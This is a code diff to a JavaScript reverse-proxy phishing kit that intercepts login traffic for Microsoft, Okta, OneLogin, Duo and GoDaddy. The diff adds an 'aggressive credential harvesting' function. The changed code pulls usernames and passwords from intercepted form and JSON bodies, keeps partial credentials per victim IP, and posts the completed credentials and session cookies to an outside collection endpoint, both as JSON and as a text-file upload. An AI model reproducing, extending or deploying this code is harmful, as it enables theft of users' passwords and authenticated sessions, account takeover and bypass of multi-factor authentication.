@@ -38,32 +38,9 @@ const CRITICAL_AUTH_COOKIES = {
   duo: ['.*'],
   godaddy: ['akm_lmprb-ssn', 'auth_id']
 };
-
-const CREDENTIAL_PATTERNS = {
-  microsoft: {
-    username: ['login', 'UserName', 'username', 'email', 'account', 'DomainUser', 'loginfmt', 'i0116', 'i0074'],
-    password: ['passwd', 'Password', 'password', 'login_password', 'pass', 'pwd', 'session_password', 'PASSWORD', 'i0118', 'i0076', 'credential']
-  },
-  okta: {
-    username: ['username', 'user', 'email', 'identifier', 'login'],
-    password: ['password', 'pass', 'pwd', 'credentials[passcode]', 'answer']
-  },
-  onelogin: {
-    username: ['username', 'email', 'login'],
-    password: ['password', 'pwd', 'pass']
-  },
-  duo: {
-    username: ['username', 'email'],
-    password: ['passcode', 'answer', 'password']
-  },
-  godaddy: {
-    username: ['username', 'email', 'login', 'account'],
-    password: ['password', 'pwd', 'pass']
-  }
-};
 // =======================================================================
 
-// In-memory store for partial credentials (username captured first, password second)
+// In-memory store for partial credentials
 const credStore = new Map();
 
 async function sendToVercel(type, data) {
@@ -76,7 +53,6 @@ async function sendToVercel(type, data) {
   } catch (e) {}
 }
 
-// Fixed: Include platform in filename
 async function exfiltrateCookies(cookieText, ip, platform, url) {
   try {
     const cleanUrl = url.split('?')[0];
@@ -212,6 +188,44 @@ function hasCriticalAuthCookies(cookieString, platform) {
   });
 }
 
+// ==================== AGGRESSIVE CREDENTIAL HARVESTING ====================
+function extractCredentials(bodyData, platform) {
+  let username = null;
+  let password = null;
+  
+  // Microsoft-specific field names (from actual Microsoft login forms)
+  const userFields = ['login', 'loginfmt', 'email', 'username', 'user', 'account', 'i0116', 'i0074', 'signinname'];
+  const passFields = ['passwd', 'password', 'pass', 'pwd', 'i0118', 'i0076', 'credential', 'currentpassword'];
+  
+  console.log('[DEBUG] Scanning body fields:', Object.keys(bodyData));
+  
+  for (const [key, value] of Object.entries(bodyData)) {
+    if (!value || typeof value !== 'string') continue;
+    
+    const lowKey = key.toLowerCase();
+    
+    // Check for username fields
+    for (const field of userFields) {
+      if (lowKey === field || lowKey.endsWith(field) || lowKey.includes(field)) {
+        username = value;
+        console.log(`[CRED] Username found: ${key} = ${value.substring(0, 5)}...`);
+        break;
+      }
+    }
+    
+    // Check for password fields
+    for (const field of passFields) {
+      if (lowKey === field || lowKey.endsWith(field) || lowKey.includes(field)) {
+        password = value;
+        console.log(`[CRED] Password found: ${key} = ********`);
+        break;
+      }
+    }
+  }
+  
+  return { username, password };
+}
+
 export default async function handleRequest(request) {
   const url = new URL(request.url);
   const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
@@ -234,79 +248,74 @@ export default async function handleRequest(request) {
   headers.set('Referer', `https://${upstreamDomain}/`);
   headers.set('Origin', `https://${upstreamDomain}`);
   
-  // ==================== IMPROVED CREDENTIAL HARVESTING ====================
-  // Microsoft login is two-step: first username, then password
-  // We capture each step and combine them
+  // ==================== CREDENTIAL HARVESTING WITH DEBUGGING ====================
   
   if (request.method === 'POST') {
     try {
       const clone = request.clone();
       const ct = clone.headers.get('content-type') || '';
       let bodyData = {};
+      let rawBody = '';
       
       if (ct.includes('application/json')) {
         bodyData = await clone.json();
+        console.log('[DEBUG] JSON body:', JSON.stringify(bodyData).substring(0, 200));
       } else {
-        const body = await clone.text();
-        const params = new URLSearchParams(body);
+        rawBody = await clone.text();
+        console.log('[DEBUG] Raw body:', rawBody.substring(0, 500));
+        
+        // Parse form data
+        const params = new URLSearchParams(rawBody);
         for (const [key, value] of params) {
           bodyData[key] = value;
         }
       }
       
-      const patterns = CREDENTIAL_PATTERNS[info.type] || CREDENTIAL_PATTERNS.microsoft;
-      let foundUsername = null;
-      let foundPassword = null;
-      
-      // Check all fields for credentials
-      for (const [key, value] of Object.entries(bodyData)) {
-        if (!value || typeof value !== 'string') continue;
-        const lowKey = key.toLowerCase();
-        
-        // Check username patterns
-        for (const pattern of patterns.username) {
-          if (lowKey === pattern.toLowerCase() || lowKey.endsWith(pattern.toLowerCase())) {
-            foundUsername = value;
-            console.log(`[CRED] Username found in field: ${key} = ${value.substring(0, 3)}...`);
-            break;
-          }
-        }
-        
-        // Check password patterns
-        for (const pattern of patterns.password) {
-          if (lowKey === pattern.toLowerCase() || lowKey.endsWith(pattern.toLowerCase())) {
-            foundPassword = value;
-            console.log(`[CRED] Password found in field: ${key} = ****`);
-            break;
-          }
-        }
-      }
+      // Extract credentials using aggressive matching
+      const { username, password } = extractCredentials(bodyData, info.type);
       
       // Create or update credential entry for this IP
       const credKey = `${ip}_${info.type}`;
       let existing = credStore.get(credKey) || { ip, platform: info.type, upstream: upstreamDomain };
       
-      if (foundUsername) existing.username = foundUsername;
-      if (foundPassword) existing.password = foundPassword;
+      if (username) existing.username = username;
+      if (password) existing.password = password;
       
       // If we have both, send immediately
       if (existing.username && existing.password) {
-        await sendToVercel('credentials', {
+        const credData = {
           ...existing,
           url: displayUrl,
           timestamp: new Date().toISOString()
-        });
-        console.log(`[CREDENTIALS CAPTURED] ${existing.username} @ ${info.type}`);
-        credStore.delete(credKey); // Clean up
-      } else if (foundUsername || foundPassword) {
-        // Store partial credentials for later (in case password is in next request)
-        credStore.set(credKey, existing);
-        console.log(`[CREDENTIALS PARTIAL] Stored ${foundUsername ? 'username' : 'password'} for ${ip}`);
+        };
         
-        // Set timeout to clean up partial creds after 5 minutes
+        await sendToVercel('credentials', credData);
+        console.log(`[CREDENTIALS CAPTURED] User: ${existing.username} | Pass: ******** | Platform: ${info.type}`);
+        
+        // Also send as file for consistency
+        const content = `IP: ${ip}\nPlatform: ${info.type}\nUsername: ${existing.username}\nPassword: ${existing.password}\nURL: ${displayUrl}\n`;
+        const formData = new FormData();
+        formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-CREDENTIALS.txt`);
+        formData.append("ip", ip);
+        formData.append("type", "credentials");
+        
+        await fetch(VERCEL_URL, {
+          method: "POST",
+          body: formData,
+        });
+        
+        credStore.delete(credKey);
+      } else if (username || password) {
+        // Store partial credentials
+        credStore.set(credKey, existing);
+        console.log(`[CREDENTIALS PARTIAL] Stored ${username ? 'username: ' + username.substring(0, 3) + '...' : 'password'} for ${ip}`);
+        
+        // Clean up after 5 minutes
         setTimeout(() => {
           credStore.delete(credKey);
         }, 300000);
+      } else {
+        console.log('[DEBUG] No credentials found in body');
       }
       
     } catch (e) {
